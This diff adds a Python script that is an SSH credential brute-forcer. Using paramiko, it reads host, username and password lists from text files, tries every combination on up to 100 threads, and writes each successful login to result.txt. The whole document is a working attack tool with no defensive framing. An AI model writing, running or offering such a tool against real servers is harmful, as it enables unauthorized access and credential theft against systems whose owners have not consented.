@@ -1,1 +1,54 @@
 
+import paramiko
+from concurrent.futures import ThreadPoolExecutor
+import sys
+
+finish_flag = False
+
+def connect(host,user,pwd):
+    global finish_flag
+    if finish_flag:
+        sys.exit()
+    try:
+        ssh=paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        ssh.connect(hostname=host,username=user,password=pwd)
+        print ("[-]Login Succ u:%s p:%s h:%s"%(user,pwd,host))
+        with open('result.txt','a+') as f:
+            f.write("h:%s u:%s p:%s\n"%(host,user,pwd))
+        finish_flag = True
+    except paramiko.ssh_exception.SSHException as err:
+        print("[x]Login Fail u:%s p:%s"%(user,pwd))
+    finally:
+        ssh.close()
+        return
+
+# 取得一个hostip,username,password
+def getInfo():
+    # ip
+    with open('host.txt') as hosts:
+        for host in hosts:
+            hostip = host.strip()
+            print("[x]Target:"+host)                      
+            # 用户名
+            with open('user.txt') as users:
+                for user in users:
+                    username = user.strip()
+                    # 密码
+                    with open('pwd.txt') as pwds:
+                        for pwd in pwds:
+                            password = pwd.strip()
+                            yield hostip,username,password
+
+
+def main():
+    paramiko.util.log_to_file("filename.log") 
+    info = getInfo()
+    # 最大线程数
+    max_thread_num = 100
+    executor = ThreadPoolExecutor(max_workers=max_thread_num)
+    for host,user,pwd in info:
+        future = executor.submit(connect,host,user,pwd)
+
+if __name__ == '__main__':
+    main()
